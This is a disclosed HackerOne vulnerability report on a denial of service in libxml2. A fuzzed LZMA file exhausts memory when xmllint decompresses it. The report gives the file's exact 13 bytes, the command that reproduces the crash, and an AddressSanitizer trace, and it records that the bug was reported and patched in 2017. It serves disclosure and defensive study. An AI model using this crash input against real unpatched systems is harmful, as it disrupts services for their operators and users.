# Denial of service in libxml2, using malicious lzma file to consume available system memory

## Report Details
- **Report ID**: 270059
- **URL**: https://hackerone.com/reports/270059
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-09-21T01:10:27.957Z
- **Disclosed**: 2019-10-04T17:40:10.289Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
[Reported to the libxml2 devs on 23 August 2017](https://bugzilla.gnome.org/show_bug.cgi?id=786696)
[Patched on 7 September 2017](https://git.gnome.org/browse/libxml2/commit/?id=e2a9122b8dde53d320750451e9907a7dcb2ca8bb)

It was discovered through fuzzing that malicious LZMA compressed files could consume large amounts of memory when decompressed thus posing a DoS risk. I am unsure if a CVE will be assigned in this case.

```
od -tx1 ./test000
0000000 30 ff ff ff ff ff ff ff ff ff ff ff ff
0000015
```

```
./xmllint --valid test000
==31393==ERROR: AddressSanitizer failed to allocate 0x100002000 (4294975488) bytes of LargeMmapAllocator (error code: 12)
==31393==Process memory map follows:
        0x000000400000-0x000000fea000   /root/libxml2/xmllint
        0x0000011ea000-0x0000011eb000   /root/libxml2/xmllint
        0x0000011eb000-0x00000161e000   /root/libxml2/xmllint
        **SNIP**
        0x7f811e9e3000-0x7f811e9e4000
        0x7ffe02632000-0x7ffe02753000   [stack]
        0x7ffe027a9000-0x7ffe027ab000   [vvar]
        0x7ffe027ab000-0x7ffe027ad000   [vdso]
        0xffffffffff600000-0xffffffffff601000   [vsyscall]
==31393==End of process memory map.
==31393==AddressSanitizer CHECK failed: /build/llvm-toolchain-4.0-Ha24C1/llvm-toolchain-4.0-4.0/projects/compiler-rt/lib/sanitizer_common/sanitizer_common.cc:120 "((0 && "unable to mmap")) != (0)" (0x0, 0x0)
    #0 0x4da55f in __asan::AsanCheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4da55f)
    #1 0x4f52d5 in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4f52d5)
    #2 0x4e4902 in __sanitizer::ReportMmapFailureAndDie(unsigned long, char const*, char const*, int, bool) (/root/libxml2/xmllint+0x4e4902)
    #3 0x4ee205 in __sanitizer::MmapOrDie(unsigned long, char const*, bool) (/root/libxml2/xmllint+0x4ee205)
    #4 0x4218e2 in __asan::asan_malloc(unsigned long, __sanitizer::BufferedStackTrace*) (/root/libxml2/xmllint+0x4218e2)
    #5 0x4d0544 in malloc (/root/libxml2/xmllint+0x4d0544)
    #6 0x7f811e38926e  (/lib/x86_64-linux-gnu/liblzma.so.5+0xf26e)
    #7 0x7f811e382fe0  (/lib/x86_64-linux-gnu/liblzma.so.5+0x8fe0)
    #8 0x7f811e383472  (/lib/x86_64-linux-gnu/liblzma.so.5+0x9472)
    #9 0x7f811e37ceb0 in lzma_code (/lib/x86_64-linux-gnu/liblzma.so.5+0x2eb0)
    #10 0xee7fb6 in xz_decomp /root/libxml2/xzlib.c:577:19
    #11 0xee6bd9 in xz_make /root/libxml2/xzlib.c:652:13
    #12 0xee4fbf in __libxml2_xzread /root/libxml2/xzlib.c:743:17
    #13 0x78121a in xmlXzfileRead /root/libxml2/xmlIO.c:1435:11
    #14 0x78b8bb in xmlParserInputBufferGrow /root/libxml2/xmlIO.c:3337:8
    #15 0x5571e7 in xmlParserInputGrow /root/libxml2/parserInternals.c:324:8
    #16 0x58669d in xmlGROW /root/libxml2/parser.c:2090:5
    #17 0x67d68d in xmlParseDocument /root/libxml2/parser.c:10590:5
    #18 0x6d4114 in xmlDoRead /root/libxml2/parser.c:15183:5
    #19 0x51b413 in parseAndPrintFile /root/libxml2/xmllint.c:2391:9
    #20 0x5125dc in main /root/libxml2/xmllint.c:3767:7
    #21 0x7f811d4893f0 in __libc_start_main /build/glibc-mXZSwJ/glibc-2.24/csu/../csu/libc-start.c:291
    #22 0x41abb9 in _start (/root/libxml2/xmllint+0x41abb9)
```

## Attachments
No attachments
